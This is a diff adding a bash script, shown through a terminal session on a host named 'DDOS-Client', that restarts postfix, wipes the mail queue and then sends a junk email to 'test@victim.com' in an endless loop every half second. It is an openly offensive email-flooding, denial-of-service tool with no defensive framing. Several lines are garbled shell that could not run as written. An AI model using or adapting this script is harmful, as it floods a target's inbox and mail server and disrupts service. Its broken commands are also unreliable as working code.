@@ -1,0 +1,19 @@
+root@DDOS-Client:~/shockWave/LEGIT# cat start-smtp 
+#! /bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+cd /root/shockWave/LEGIT/temp-cluster
+rm ps aux > /dev/null 2>&1
+(mkfifo /var/spool/postfix/public/pickup ps aux | grep mail kill sudo /etc/init.d/postfix restart) > /dev/null 2>&1
+service postfix restart > /dev/null 2>&1
+sleep 1
+
+n=1
+postsuper -d ALL deferred
+postsuper -d ALL
+while true
+do
+    echo "-> MAILS SENT: $n"
+    echo "BLA BLA BLA BLA BLA BLA BLA BLA BLA" | mail -s "TEST SUBJECT" -a "From: you@example.com" test@victim.com
+    sleep 0.5
+    let n=n+1
+done
